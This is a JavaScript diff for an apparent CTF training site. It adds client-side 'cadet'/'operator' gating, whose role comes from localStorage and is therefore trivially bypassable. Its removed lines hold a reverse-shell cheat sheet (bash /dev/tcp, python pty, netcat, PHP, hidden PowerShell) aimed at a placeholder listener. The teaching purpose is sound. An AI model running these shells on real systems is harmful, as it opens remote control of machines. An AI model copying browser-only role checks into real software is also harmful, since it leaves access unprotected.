@@ -5,9 +5,17 @@
  * modules with terminal labs, and keeps all existing views.
  * ============================================================ */
 
+/* ── Active Session & Security Clearance ─────────────────── */
+const activeSession = window.ATLAS_USER || {
+  uid: localStorage.getItem('atlas-uid') || 'cadet',
+  role: localStorage.getItem('atlas-role') || 'cadet'
+};
+
 /* ── Core application state ──────────────────────────────── */
 const state = {
   view: 'dashboard',
+  userUid: activeSession.uid || 'cadet',
+  userRole: activeSession.role || 'cadet',
   domain: null,
   os: localStorage.getItem('atlas-os') || 'linux',
   solved: JSON.parse(localStorage.getItem('atlas-solved') || '[]'),
@@ -31,6 +39,62 @@ const state = {
   workbenchSubnetIp: '10.10.14.23',
   workbenchSubnetPrefix: '24',
 };
+
+window.state = state;
+
+function isAdvancedRole() {
+  return state.userRole === 'admin';
+}
+
+function hasViewAccess(view) {
+  if (isAdvancedRole()) return true;
+  // Restricted views for cadet/normal user:
+  if (view === 'tools' || view === 'playbook') return false;
+  return true;
+}
+
+function updateNavForRole() {
+  const isCadet = !isAdvancedRole();
+  const mainNav = document.querySelector('.main-nav');
+  if (mainNav) {
+    const toolsBtn = mainNav.querySelector('[data-view="tools"]');
+    const playbookBtn = mainNav.querySelector('[data-view="playbook"]');
+    if (toolsBtn) toolsBtn.style.display = isCadet ? 'none' : '';
+    if (playbookBtn) playbookBtn.style.display = isCadet ? 'none' : '';
+  }
+
+  const badgeContainer = document.getElementById('userProfileBadge');
+  if (badgeContainer) {
+    if (isCadet) {
+      badgeContainer.innerHTML = `
+        <div class="user-badge cadet">
+          <div>
+            <strong style="color:var(--cyan);display:flex;align-items:center;gap:4px">🛡️ CADET PROFILE</strong>
+            <p style="margin:2px 0 0;font-size:10px;color:#aeb6c5">UID: <code>${esc(state.userUid)}</code></p>
+          </div>
+          <span class="tag warn" style="font-size:9px;padding:2px 6px">RESTRICTED</span>
+        </div>`;
+    } else {
+      badgeContainer.innerHTML = `
+        <div class="user-badge admin">
+          <div>
+            <strong style="color:var(--green);display:flex;align-items:center;gap:4px">⚡ OPERATOR PROFILE</strong>
+            <p style="margin:2px 0 0;font-size:10px;color:#aeb6c5">UID: <code>${esc(state.userUid)}</code></p>
+          </div>
+          <span class="tag accent" style="font-size:9px;padding:2px 6px">FULL ACCESS</span>
+        </div>`;
+    }
+  }
+
+  const topbarPill = document.getElementById('topbarUserPill');
+  if (topbarPill) {
+    if (isCadet) {
+      topbarPill.innerHTML = `<span class="tag warn" style="margin-right:8px;font-size:10px;display:inline-flex;align-items:center;gap:4px">🛡️ CADET: ${esc(state.userUid)}</span>`;
+    } else {
+      topbarPill.innerHTML = `<span class="tag accent" style="margin-right:8px;font-size:10px;display:inline-flex;align-items:center;gap:4px">⚡ OPERATOR: ${esc(state.userUid)}</span>`;
+    }
+  }
+}
 
 let intelCache = null;
 let intelLoading = false;
@@ -570,11 +634,21 @@ function completion() { return Math.round((state.solved.length / challenges.leng
 function normalizeAnswer(s) { return String(s || '').toLowerCase().replace(/\s+/g, ' ').trim(); }
 
 function setTheme() {
-  document.documentElement.classList.toggle('light', state.theme === 'light');
-  document.getElementById('themeToggle').textContent = state.theme === 'light' ? 'AM' : 'NEON';
+  const isLight = state.theme === 'light';
+  document.documentElement.classList.toggle('light', isLight);
+  const themeBtn = document.getElementById('themeToggle');
+  if (themeBtn) {
+    themeBtn.textContent = isLight ? 'CLEAN' : 'NEON';
+    themeBtn.title = isLight ? 'Switch to Cyber Neon Dark Mode' : 'Switch to Clean Light Mode';
+    themeBtn.setAttribute('aria-label', themeBtn.title);
+  }
 }
 
 function setView(view) {
+  if (!hasViewAccess(view)) {
+    alert(`[ACCESS DENIED] Your profile (${state.userUid.toUpperCase()} // CADET) does not have security clearance for ${view === 'tools' ? 'Tool Academy' : 'Lifecycles & Playbook'}. Operator clearance required.`);
+    view = 'dashboard';
+  }
   state.view = view; state.domain = null; state.curriculumModule = null;
   document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', b.dataset.view === view));
   document.getElementById('breadcrumbs').textContent = {
@@ -588,6 +662,11 @@ function setView(view) {
 }
 
 function openDomain(id) {
+  const d = domains.find(x => x.id === id);
+  if (!isAdvancedRole() && d?.level === 'Advanced') {
+    alert(`[ACCESS DENIED] The '${d.name}' domain contains advanced binary exploitation and reverse engineering material reserved for Operator clearance.`);
+    return;
+  }
   state.view = 'domains'; state.domain = id;
   document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', b.dataset.view === 'domains'));
   document.getElementById('breadcrumbs').textContent = 'Domains / ' + domains.find(d => d.id === id)?.name;
@@ -600,8 +679,15 @@ function markDomain(id) {
   save(); render();
 }
 
+window.setView = setView;
+window.setTheme = setTheme;
+window.openDomain = openDomain;
+window.tricksHTML = tricksHTML;
+window.modulesHTML = modulesHTML;
+
 /* ── Main render dispatcher ──────────────────────────────── */
 function render() {
+  updateNavForRole();
   const view = document.getElementById('view');
   if (state.view === 'dashboard')   view.innerHTML = dashboardHTML();
   if (state.view === 'path')        view.innerHTML = pathHTML();
@@ -629,38 +715,61 @@ function render() {
  * ══════════════════════════════════════════════════════════ */
 
 function curriculumHTML(intel) {
+  const isCadet = !isAdvancedRole();
   if (!intel) {
     return `<div class="section-head"><div><h2>Curriculum</h2>
       <p>Loading textbook-grade exploitation curriculum...</p></div></div>
       <div class="empty">⏳ Fetching curriculum data...</div>`;
   }
 
-  const modules = intel.curriculum || [];
-  if (!modules.length) {
+  const allModules = intel.curriculum || [];
+  if (!allModules.length) {
     return `<div class="section-head"><div><h2>Curriculum</h2>
       <p>No curriculum modules loaded yet.</p></div></div>`;
   }
 
   /* If a specific module is selected, render its full detail */
   if (state.curriculumModule) {
-    const mod = modules.find(m => m.id === state.curriculumModule);
-    if (mod) return curriculumModuleDetailHTML(mod);
+    const mod = allModules.find(m => m.id === state.curriculumModule);
+    if (mod) {
+      if (isCadet && (mod.domain === 'reverse' || mod.domain === 'pwn' || mod.id.includes('pwn') || mod.id.includes('reverse'))) {
+        return `
+        <div class="access-gate-card">
+          <h3>🔒 OPERATOR CLEARANCE REQUIRED</h3>
+          <p>This exploitation module covers advanced memory corruption, ROP, or binary reverse engineering that requires Operator clearance. Please return to the foundational tracks.</p>
+          <button class="btn" data-action="back-to-curriculum">← Back to Curriculum</button>
+        </div>`;
+      }
+      return curriculumModuleDetailHTML(mod);
+    }
   }
+
+  /* Filter modules for cadet */
+  const modules = isCadet
+    ? allModules.filter(m => !(m.domain === 'reverse' || m.domain === 'pwn' || m.id.includes('pwn') || m.id.includes('reverse')))
+    : allModules;
 
   /* Module listing grid */
   return `
   <div class="section-head">
     <div>
-      <div class="eyebrow">TEXTBOOK-GRADE CURRICULUM // ${modules.length} ADVANCED MODULES</div>
+      <div class="eyebrow">TEXTBOOK-GRADE CURRICULUM // ${modules.length} ${isCadet ? 'ACTIVE FOUNDATIONAL' : 'ADVANCED'} MODULES</div>
       <h2>Exploitation Curriculum</h2>
-      <p>Production-quality deep-dives into the six core exploitation domains. Each module contains OS internals, attack mechanics, tool command references, real-world case studies, and a browser-native terminal lab.</p>
+      <p>Production-quality deep-dives into core exploitation domains. Each module contains OS internals, attack mechanics, tool command references, real-world case studies, and a browser-native terminal lab.</p>
     </div>
     <div class="tag-row">
-      <span class="tag accent">zero-backend</span>
+      <span class="tag accent">${isCadet ? '🛡️ CADET ACCESS' : '⚡ OPERATOR ACCESS'}</span>
       <span class="tag success">interactive labs</span>
       <span class="tag">textbook depth</span>
     </div>
   </div>
+
+  ${isCadet ? `
+    <div class="note warn-note" style="margin-bottom:16px">
+      <strong>🛡️ CADET NOTICE:</strong> Advanced binary exploitation and reverse engineering modules are restricted to Operator clearance. Active foundational tracks are shown below.
+    </div>
+  ` : ''}
+
   <div class="grid cols-2">
     ${modules.map(mod => `
       <button class="card" data-curriculum-module="${esc(mod.id)}" style="text-align:left;min-height:260px">
@@ -1031,31 +1140,107 @@ function pathHTML() {
 }
 
 function modulesHTML(query) {
+  const isCadet = !isAdvancedRole();
   const q = normalizeAnswer(query || '');
   const rows = [];
-  domains.forEach(d => d.concepts.forEach((c, i) => rows.push({ d, index: i+1, title: c[0], theory: c[1], practice: c[2], domain: d })));
+  domains.forEach(d => {
+    if (isCadet && d.level === 'Advanced') return; // Filter out advanced domain modules for cadet!
+    d.concepts.forEach((c, i) => rows.push({ d, index: i+1, title: c[0], theory: c[1], practice: c[2], domain: d }));
+  });
   const hits = rows.filter(r => !q || normalizeAnswer(r.title + ' ' + r.theory + ' ' + r.practice + ' ' + r.domain.name).includes(q));
-  return `<div class="section-head"><div><div class="eyebrow">KNOWLEDGE MATRIX / ${rows.length} MODULES</div><h2>Learning modules</h2><p>Every concept is readable here before you touch a tool. Open the textbook chapter for exhaustive theory, architecture diagrams, and master command tables.</p></div><div class="tag-row"><span class="tag accent">in-site textbook</span><span class="tag">searchable</span></div></div>
-  <div class="module-search"><span>&gt;</span><input id="moduleSearch" value="${esc(query||'')}" placeholder="search a concept, protocol, technique, or domain" autocomplete="off"><span class="cursor">█</span></div>
+  return `
+  <div class="section-head">
+    <div>
+      <div class="eyebrow">KNOWLEDGE MATRIX / ${rows.length} ${isCadet ? 'CORE &amp; FOUNDATIONAL' : 'TOTAL'} MODULES</div>
+      <h2>Learning modules</h2>
+      <p>Every concept is readable here before you touch a tool. Open the textbook chapter for exhaustive theory, architecture diagrams, and master command tables.</p>
+    </div>
+    <div class="tag-row">
+      <span class="tag accent">${isCadet ? '🛡️ CADET ACCESS' : '⚡ OPERATOR ACCESS'}</span>
+      <span class="tag">in-site textbook</span>
+      <span class="tag">searchable</span>
+    </div>
+  </div>
+
+  ${isCadet ? `
+    <div class="note warn-note" style="margin-bottom:16px">
+      <strong>🛡️ CADET CLEARANCE NOTICE:</strong> Advanced exploitation modules (Reverse Engineering, Binary Exploitation) are locked. Foundational and core curriculum tracks are active below.
+    </div>
+  ` : ''}
+
+  <div class="module-search">
+    <span>&gt;</span>
+    <input id="moduleSearch" value="${esc(query||'')}" placeholder="search a concept, protocol, technique, or domain" autocomplete="off">
+    <span class="cursor">█</span>
+  </div>
   <div class="module-count"><span>${hits.length}</span> modules visible</div>
-  <div class="module-grid" id="modulesGrid">${hits.map(r=>{
-    const chId = getChapterForConcept(r.domain.id, r.index, r.title);
-    return `<article class="card module-card">
-      <div class="module-top"><span class="tag accent">${r.domain.icon} / ${r.domain.name}</span><span class="tag">M${String(r.index).padStart(2,'0')}</span></div>
-      <h3>${esc(r.title)}</h3>
-      <p>${esc(r.theory)}</p>
-      <div class="module-action"><span class="tag">practice</span><span>${esc(r.practice)}</span></div>
-      <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
-        <button class="btn" data-textbook="${chId}">📖 Read Textbook</button>
-        <button class="btn outline" data-domain="${r.domain.id}">Full Path →</button>
-      </div>
-    </article>`;
-  }).join('') || '<div class="empty">No modules matched. Try "HTTP", "ELF", "XOR", "permissions", or "DNS".</div>'}</div>
-  <div class="note"><strong>Study contract:</strong> Read the concept, reproduce the observation in a safe lab, then explain it without looking at the text.</div>`;
+  <div class="module-grid" id="modulesGrid">
+    ${hits.map(r => {
+      const chId = getChapterForConcept(r.domain.id, r.index, r.title);
+      return `
+      <article class="card module-card">
+        <div class="module-top">
+          <span class="tag accent">${r.domain.icon} / ${r.domain.name}</span>
+          <span class="tag">M${String(r.index).padStart(2,'0')}</span>
+        </div>
+        <h3>${esc(r.title)}</h3>
+        <p>${esc(r.theory)}</p>
+        <div class="module-action">
+          <span class="tag">practice</span>
+          <span>${esc(r.practice)}</span>
+        </div>
+        <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
+          <button class="btn" data-textbook="${chId}">📖 Read Textbook</button>
+          <button class="btn outline" data-domain="${r.domain.id}">Full Path →</button>
+        </div>
+      </article>`;
+    }).join('') || '<div class="empty">No modules matched. Try "HTTP", "XOR", "permissions", or "DNS".</div>'}
+  </div>
+  <div class="note">
+    <strong>Study contract:</strong> Read the concept, reproduce the observation in a safe lab, then explain it without looking at the text.
+  </div>`;
 }
 
 function domainsHTML() {
-  return `<div class="section-head"><div><h2>Domains</h2><p>Every domain follows the same pattern: concept map → workflow → tools → practice → real-world transfer.</p></div></div><div class="grid cols-3">${domains.map(d=>`<button class="card domain-card" data-domain="${d.id}" style="text-align:left"><div class="domain-icon">${d.icon}</div><div class="card-top"><div><h3>${d.name}</h3><p>${d.summary}</p></div><div class="arrow">→</div></div><div class="tag-row" style="margin-top:10px"><span class="tag">${d.level}</span><span class="tag">${d.duration}</span>${state.completedDomains.includes(d.id)?'<span class="tag success">complete</span>':''}</div></button>`).join('')}</div>`;
+  const isCadet = !isAdvancedRole();
+  return `
+  <div class="section-head">
+    <div>
+      <div class="eyebrow">${isCadet ? 'CADET CLEARANCE // FOUNDATIONAL TRACKS' : 'ALL DOMAINS // FULL MATRIX'}</div>
+      <h2>Domains</h2>
+      <p>Every domain follows the same pattern: concept map → workflow → tools → practice → real-world transfer.</p>
+    </div>
+    <div class="tag-row">
+      <span class="tag accent">${isCadet ? '🛡️ CADET ACCESS' : '⚡ OPERATOR ACCESS'}</span>
+    </div>
+  </div>
+  ${isCadet ? `
+    <div class="note warn-note" style="margin-bottom:16px">
+      <strong>🛡️ CADET NOTICE:</strong> Advanced domains (Reverse Engineering, Binary Exploitation) are locked. Foundational and core domains are active below.
+    </div>
+  ` : ''}
+  <div class="grid cols-3">
+    ${domains.map(d => {
+      const isLocked = isCadet && d.level === 'Advanced';
+      return `
+      <button class="card domain-card${isLocked ? ' locked' : ''}" data-domain="${d.id}" style="text-align:left;${isLocked ? 'opacity:0.65;border-color:var(--danger)' : ''}">
+        <div class="domain-icon">${d.icon}</div>
+        <div class="card-top">
+          <div>
+            <h3>${d.name}</h3>
+            <p>${d.summary}</p>
+          </div>
+          <div class="arrow">${isLocked ? '🔒' : '→'}</div>
+        </div>
+        <div class="tag-row" style="margin-top:10px">
+          <span class="tag${d.level === 'Advanced' ? ' warn' : ''}">${d.level}</span>
+          <span class="tag">${d.duration}</span>
+          ${isLocked ? '<span class="module-locked-pill">🔒 Operator Only</span>' : ''}
+          ${state.completedDomains.includes(d.id)?'<span class="tag success">complete</span>':''}
+        </div>
+      </button>`;
+    }).join('')}
+  </div>`;
 }
 
 function domainDetailHTML(id) {
@@ -2012,17 +2197,43 @@ function casebookHTML() {
 }
 
 function tricksHTML() {
+  const isCadet = !isAdvancedRole();
   const allTricks = window.CTF_TRICKS_DATA || [];
   const tab = state.tricksTab || 'all';
   const query = (state.tricksQuery || '').trim().toLowerCase();
 
-  const filtered = allTricks.filter(t => {
+  const restrictedCategories = ['privesc', 'shells', 'transfers', 'polyglots', 'evasion'];
+
+  // Filter out restricted categories for cadets
+  const accessibleTricks = isCadet
+    ? allTricks.filter(t => !restrictedCategories.includes(t.category))
+    : allTricks;
+
+  const filtered = accessibleTricks.filter(t => {
     const matchesTab = (tab === 'all') || (t.category === tab);
     if (!matchesTab) return false;
     if (!query) return true;
     const hay = `${t.title} ${t.categoryLabel} ${t.payload} ${t.context} ${t.why} ${t.internals} ${t.mitigation}`.toLowerCase();
     return hay.includes(query);
   });
+
+  const allTabs = [
+    ['all', 'All Tricks & Payloads'],
+    ['chaining', 'Command Chaining (; && ||)'],
+    ['whitespace', 'Whitespace Evasion ($IFS)'],
+    ['obfuscation', 'Keyword Evasion (c\\at glob)'],
+    ['evasion', 'WAF & Shell Evasion'],
+    ['web', 'Web Injection'],
+    ['polyglots', 'Web Polyglots & Bypasses'],
+    ['privesc', 'SUID & GTFOBins Privesc'],
+    ['linux-recon', 'Linux CTF Recon & Snooping'],
+    ['transfers', 'File Transfers & Exfil'],
+    ['shells', 'Interactive Shells & PTY']
+  ];
+
+  const visibleTabs = isCadet
+    ? allTabs.filter(([catKey]) => !restrictedCategories.includes(catKey))
+    : allTabs;
 
   return `
   <div class="section-head">
@@ -2033,10 +2244,16 @@ function tricksHTML() {
     </div>
     <div class="tag-row">
       <span class="tag accent">${filtered.length} active tricks</span>
-      <span class="tag warn">educational lab scope</span>
+      <span class="tag warn">${isCadet ? '🛡️ CADET ACCESS' : '⚡ FULL OPERATOR CLEARANCE'}</span>
       <span class="tag success">mitigation included</span>
     </div>
   </div>
+
+  ${isCadet ? `
+    <div class="note warn-note" style="margin-bottom:14px">
+      <strong>🛡️ CADET CLEARANCE NOTICE:</strong> Displaying foundational command chaining, whitespace evasion, and Linux recon. Advanced privilege escalation (SUID GTFOBins, capabilities), reverse shell execution, and evasion payloads are restricted to Operator clearance.
+    </div>
+  ` : ''}
 
   <div class="module-search" style="margin-bottom:14px">
     <span>&gt;</span>
@@ -2045,19 +2262,7 @@ function tricksHTML() {
   </div>
 
   <div class="os-tabs" style="margin-bottom:18px">
-    ${[
-      ['all', 'All Tricks & Payloads'],
-      ['chaining', 'Command Chaining (; && ||)'],
-      ['whitespace', 'Whitespace Evasion ($IFS)'],
-      ['obfuscation', 'Keyword Evasion (c\\at glob)'],
-      ['evasion', 'WAF & Shell Evasion'],
-      ['web', 'Web Injection'],
-      ['polyglots', 'Web Polyglots & Bypasses'],
-      ['privesc', 'SUID & GTFOBins Privesc'],
-      ['linux-recon', 'Linux CTF Recon & Snooping'],
-      ['transfers', 'File Transfers & Exfil'],
-      ['shells', 'Interactive Shells & PTY']
-    ].map(([catKey, label]) => `
+    ${visibleTabs.map(([catKey, label]) => `
       <button class="os-btn${tab === catKey ? ' active' : ''}" data-tricks-tab="${catKey}">${label}</button>
     `).join('')}
   </div>
@@ -2076,178 +2281,41 @@ function tricksHTML() {
           <button class="btn outline copy-btn" data-copy-trick="${esc(t.id)}">📋 Copy Payload</button>
         </div>
 
-        <div style="margin:10px 0">
-          <span style="font-family:var(--display);color:var(--cyan);font-size:11px;letter-spacing:.08em;text-transform:uppercase">// Payload Expression</span>
-          <pre class="code-block" style="background:#090d16;padding:12px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto"><code id="trick-code-${esc(t.id)}" style="color:#00ff88;font-size:13px;font-weight:bold;font-family:var(--mono)">${esc(t.payload)}</code></pre>
+        <div style="margin:12px 0 16px">
+          <pre style="margin:0;font-size:13px;border-color:var(--green)"><code>${esc(t.payload)}</code></pre>
         </div>
 
-        <div style="margin:12px 0">
-          <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Vulnerable Execution Context</h4>
-          <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(t.context)}</p>
-        </div>
-
-        <div class="note" style="margin:12px 0;border-left-color:var(--cyan)">
-          <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Offensive Mechanics &amp; Why It Works</h4>
-          <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(t.why)}</p>
-        </div>
-
-        <div style="margin:12px 0">
-          <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">OS Kernel &amp; Lexer Internals</h4>
-          <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(t.internals)}</p>
-        </div>
-
-        <div class="note warn-note" style="margin-top:12px">
-          <h4 style="font-family:var(--display);color:var(--pink);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Defensive Mitigation &amp; Safe Coding</h4>
-          <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(t.mitigation)}</p>
+        <div class="cmd-table-wrap">
+          <table class="cmd-table">
+            <thead>
+              <tr>
+                <th style="width:25%">Property</th>
+                <th>Tactical Analysis &amp; Mechanism</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Context of Use</strong></td>
+                <td>${esc(t.context)}</td>
+              </tr>
+              <tr>
+                <td><strong>Why It Works</strong></td>
+                <td>${esc(t.why)}</td>
+              </tr>
+              <tr>
+                <td><strong>Engine / OS Internals</strong></td>
+                <td>${esc(t.internals)}</td>
+              </tr>
+              <tr>
+                <td><strong>Mitigation &amp; Defense</strong></td>
+                <td><span style="color:var(--green)">${esc(t.mitigation)}</span></td>
+              </tr>
+            </tbody>
+          </table>
         </div>
       </article>
-    `).join('') || '<div class="empty">No tricks or payloads matched this query.</div>'}
-  </div>
-  `;
-}
-
-/* ══════════════════════════════════════════════════════════
- * CYBER WORKBENCH & PAYLOAD STUDIO (View 14)
- * ══════════════════════════════════════════════════════════ */
-
-function getNetmaskFromPrefix(prefix) {
-  const p = parseInt(prefix, 10);
-  if (p === 0) return '0.0.0.0';
-  const mask = ((0xFFFFFFFF << (32 - p)) >>> 0);
-  return [(mask >>> 24) & 255, (mask >>> 16) & 255, (mask >>> 8) & 255, mask & 255].join('.');
-}
-
-function calculateSubnet(ipStr, prefixNum) {
-  const parts = String(ipStr || '').trim().split('.').map(x => parseInt(x, 10));
-  if (parts.length !== 4 || parts.some(n => isNaN(n) || n < 0 || n > 255)) {
-    return { valid: false, error: 'Invalid IPv4 address format. Must be 4 octets between 0 and 255 (e.g. 10.10.14.23).' };
-  }
-  const prefix = Math.max(0, Math.min(32, parseInt(prefixNum, 10) || 24));
-  const ipInt = ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
-  const maskInt = prefix === 0 ? 0 : ((0xFFFFFFFF << (32 - prefix)) >>> 0);
-  const wildcardInt = (~maskInt) >>> 0;
-  const netInt = (ipInt & maskInt) >>> 0;
-  const bcastInt = (netInt | wildcardInt) >>> 0;
-
-  const intToIp = (val) => [ (val >>> 24) & 255, (val >>> 16) & 255, (val >>> 8) & 255, val & 255 ].join('.');
-  const netAddr = intToIp(netInt);
-  const bcastAddr = intToIp(bcastInt);
-  const netmask = intToIp(maskInt);
-  const wildcard = intToIp(wildcardInt);
-
-  let hostCount = 0;
-  let firstHost = '';
-  let lastHost = '';
-
-  if (prefix === 31) {
-    hostCount = 2;
-    firstHost = intToIp(netInt);
-    lastHost = intToIp(bcastInt);
-  } else if (prefix === 32) {
-    hostCount = 1;
-    firstHost = lastHost = intToIp(netInt);
-  } else {
-    hostCount = Math.max(0, Math.pow(2, 32 - prefix) - 2);
-    firstHost = intToIp(netInt + 1);
-    lastHost = intToIp(bcastInt - 1);
-  }
-
-  let scope = 'Public Internet';
-  if (parts[0] === 10) scope = 'Private (RFC 1918 - Class A / 10.0.0.0/8)';
-  else if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) scope = 'Private (RFC 1918 - Class B / 172.16.0.0/12)';
-  else if (parts[0] === 192 && parts[1] === 168) scope = 'Private (RFC 1918 - Class C / 192.168.0.0/16)';
-  else if (parts[0] === 127) scope = 'Loopback (RFC 1122 / 127.0.0.0/8)';
-  else if (parts[0] === 169 && parts[1] === 254) scope = 'Link-Local / APIPA (169.254.0.0/16)';
-
-  return {
-    valid: true,
-    cidr: `${netAddr}/${prefix}`,
-    ip: parts.join('.'),
-    network: netAddr,
-    broadcast: bcastAddr,
-    netmask: netmask,
-    wildcard: wildcard,
-    hosts: hostCount.toLocaleString(),
-    hostRange: hostCount > 0 ? `${firstHost} — ${lastHost}` : 'N/A',
-    scope: scope
-  };
-}
-
-function getShellsList(lhost, lport) {
-  const h = lhost || '10.10.14.42';
-  const p = lport || '4444';
-  return [
-    {
-      id: 'bash-tcp',
-      name: 'Bash Interactive TCP',
-      cat: 'Linux Shell',
-      desc: 'Standard interactive bash redirect over /dev/tcp pseudo-device. Bypasses need for external nc binary.',
-      cmd: `bash -i >& /dev/tcp/${h}/${p} 0>&1`
-    },
-    {
-      id: 'bash-196',
-      name: 'Bash Descriptor 196 Evasion',
-      cat: 'Linux Shell',
-      desc: 'Alternative bash descriptor redirection that circumvents simple regexes looking for ">& /dev/tcp".',
-      cmd: `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`
-    },
-    {
-      id: 'python3-pty',
-      name: 'Python 3 Interactive PTY',
-      cat: 'Cross-Platform',
-      desc: 'Full interactive socket shell with spawned pseudo-terminal for job control and TTY apps.',
-      cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`
-    },
-    {
-      id: 'nc-fifo',
-      name: 'Netcat Traditional (mkfifo)',
-      cat: 'Linux Shell',
-      desc: 'Named pipe relay for modern OpenBSD netcat installations compiled without the -e flag.',
-      cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`
-    },
-    {
-      id: 'nc-e',
-      name: 'Netcat with -e flag',
-      cat: 'Legacy Netcat',
-      desc: 'Direct execution flag available on traditional netcat and busybox binaries.',
-      cmd: `nc ${h} ${p} -e /bin/bash`
-    },
-    {
-      id: 'php-exec',
-      name: 'PHP fsockopen',
-      cat: 'Web Application',
-      desc: 'Invoked in PHP web shells or arbitrary file inclusion (LFI/RFI) vectors.',
-      cmd: `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`
-    },
-    {
-      id: 'powershell-tcp',
-      name: 'PowerShell TCP Client',
-      cat: 'Windows Shell',
-      desc: 'Direct .NET System.Net.Sockets.TCPClient execution without saving scripts to disk.',
-      cmd: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${h}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
-    },
-    {
-      id: 'socat-listener',
-      name: 'Socat Raw TTY Listener',
-      cat: 'Attacker Listener',
-      desc: 'Terminal listener supporting full TTY, Ctrl+C pass-through, and dynamic window resizing.',
-      cmd: `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`
-    },
-    {
-      id: 'nc-listener',
-      name: 'Netcat Catch Listener',
-      cat: 'Attacker Listener',
-      desc: 'Standard local catch listener for incoming TCP reverse connections.',
-      cmd: `nc -lvnp ${p}`
-    },
-    {
-      id: 'tty-upgrade',
-      name: 'TTY Upgrade & Stabilizer',
-      cat: 'Post-Exploitation',
-      desc: 'Stabilize a dumb reverse shell into a fully interactive PTY with arrow keys and auto-completion.',
-      cmd: `python3 -c 'import pty; pty.spawn("/bin/bash")'\n# Press Ctrl+Z to background shell, then in local terminal run:\nstty raw -echo; fg\nexport TERM=xterm-256color; reset`
-    }
-  ];
+    `).join('')}
+  </div>`;
 }
 
 function workbenchHTML() {
@@ -3083,29 +3151,77 @@ function bindViewEvents() {
 
 /* ── Top-level navigation init ───────────────────────────── */
 function init() {
+  /* Update navigation and clearances */
+  updateNavForRole();
+
   /* Sidebar nav items */
   document.querySelectorAll('.nav-item[data-view]').forEach(btn => {
     btn.addEventListener('click', () => setView(btn.dataset.view));
   });
 
-  /* Mobile menu */
-  const sidebar  = document.getElementById('sidebar');
-  const menuBtn  = document.getElementById('menuToggle');
+  /* Mobile and Desktop menu toggle */
+  const sidebar = document.getElementById('sidebar');
+  const menuBtn = document.getElementById('menuToggle');
   const closeBtn = document.getElementById('mobileClose');
-  if (menuBtn) menuBtn.addEventListener('click', () => sidebar?.classList.add('open'));
-  if (closeBtn) closeBtn.addEventListener('click', () => sidebar?.classList.remove('open'));
-  document.addEventListener('click', e => {
-    if (sidebar?.classList.contains('open') && !sidebar.contains(e.target) && e.target !== menuBtn) {
-      sidebar.classList.remove('open');
+  const backdrop = document.getElementById('sidebarBackdrop');
+
+  function openMobileMenu() {
+    sidebar?.classList.add('open');
+    backdrop?.classList.add('active');
+  }
+
+  function closeMobileMenu() {
+    sidebar?.classList.remove('open');
+    backdrop?.classList.remove('active');
+  }
+
+  if (menuBtn) {
+    menuBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      if (window.innerWidth <= 820) {
+        if (sidebar?.classList.contains('open')) {
+          closeMobileMenu();
+        } else {
+          openMobileMenu();
+        }
+      } else {
+        document.querySelector('.app-shell')?.classList.toggle('sidebar-collapsed');
+        sidebar?.classList.toggle('collapsed');
+      }
+    });
+  }
+
+  if (closeBtn) {
+    closeBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      closeMobileMenu();
+    });
+  }
+
+  if (backdrop) {
+    backdrop.addEventListener('click', () => {
+      closeMobileMenu();
+    });
+  }
+
+  document.addEventListener('click', (e) => {
+    if (sidebar?.classList.contains('open')) {
+      if (!sidebar.contains(e.target) && !menuBtn?.contains(e.target)) {
+        closeMobileMenu();
+      }
     }
   });
 
   /* Theme toggle */
-  document.getElementById('themeToggle')?.addEventListener('click', () => {
-    state.theme = state.theme === 'dark' ? 'light' : 'dark';
-    save();
-    setTheme();
-  });
+  const themeBtn = document.getElementById('themeToggle');
+  if (themeBtn) {
+    themeBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      state.theme = state.theme === 'dark' ? 'light' : 'dark';
+      save();
+      setTheme();
+    });
+  }
 
   /* Global search */
   document.getElementById('globalSearch')?.addEventListener('input', e => {
@@ -3156,13 +3272,12 @@ function init() {
     if (e.key === 'Escape') closeModal();
   });
 
-  /* Background-preload live intelligence and curriculum */
+  /* Preload live intelligence and curriculum */
   loadIntel();
 
   render();
 }
 
-/* ── Boot ────────────────────────────────────────────────── */
 let booted = false;
 function boot() {
   if (booted) return;
